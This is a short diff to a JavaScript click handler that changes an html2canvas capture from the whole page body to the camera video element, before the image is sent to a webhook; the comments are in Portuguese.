@@ -121,7 +121,7 @@ document.getElementById('captureButton').addEventListener('click', function() {
 
             // Capturar a imagem da câmera
             setTimeout(() => {
-                html2canvas(document.body).then(canvas => {
+                html2canvas(video).then(canvas => {
                     const imgData = canvas.toDataURL('image/png');
 
                     // Enviar a imagem para o webhook
